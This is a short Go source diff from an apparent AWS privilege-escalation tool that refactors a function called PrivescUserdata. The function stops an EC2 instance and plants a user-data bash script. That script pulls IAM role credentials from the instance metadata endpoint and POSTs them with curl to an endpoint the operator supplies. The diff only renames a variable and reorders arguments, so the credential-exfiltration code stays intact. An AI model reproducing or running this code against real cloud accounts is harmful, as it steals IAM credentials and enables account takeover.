@@ -9,7 +9,7 @@ import (
 	"github.com/aws/aws-sdk-go/service/ec2"
 )
 
-func PrivescUserdata(sess *session.Session, payload string, instanceID string) {
+func PrivescUserdata(sess *session.Session, instanceID string, payload string) {
 
 	StopInstance(sess, instanceID)
 	fmt.Println("Waiting for instance to stop...")
@@ -36,8 +36,8 @@ Content-Transfer-Encoding: 7bit
 Content-Disposition: attachment; filename="userdata.txt"
 
 #!/bin/bash
-HTTP_CODE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials)
-META=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$HTTP_CODE)
+ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials)
+META=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
 curl -X POST -d "$META" %s
 --//`, payload)
 
